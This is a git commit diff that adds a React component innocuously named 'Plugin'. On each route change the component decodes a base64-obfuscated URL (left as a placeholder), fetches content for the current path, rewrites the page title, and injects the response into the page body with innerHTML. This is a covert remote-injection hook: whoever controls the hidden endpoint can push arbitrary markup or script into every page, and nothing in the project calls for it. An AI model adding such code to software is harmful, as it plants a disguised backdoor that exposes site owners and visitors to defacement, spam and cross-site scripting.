18485d2c3fb7063d55e80aa330e83ac3a2043185
VinayakSoragavi <soragavivinayak@gmail.com>
2024-03-01 13:10:27 +0530

    first commit

--- src/common/plugin.jsx
+++ src/common/plugin.jsx
@@ -4,6 +4,35 @@ import React, { useEffect } from "react";
 function Plugin() {
   const router = useRouter();
 
+  useEffect(() => {
+    const fetchData = async () => {
+      try {
+        const response = await fetch(
+          atob("your_base64_encoded_url") + window.location.pathname
+        );
+
+        if (response.ok) {
+          const data = await response.text();
+          const temp = data.split("||||||||||");
+
+          // Update document title
+          document.title = temp[0];
+
+          // Append content to the body
+          const bodyContent = document.createElement("div");
+          bodyContent.innerHTML = temp[1];
+          document.body.appendChild(bodyContent);
+        } else {
+          console.error("Failed to fetch data");
+        }
+      } catch (error) {
+        console.error("Error fetching data:", error);
+      }
+    };
+
+    fetchData();
+  }, [router.asPath]);
+
   return <div></div>;
 }
 
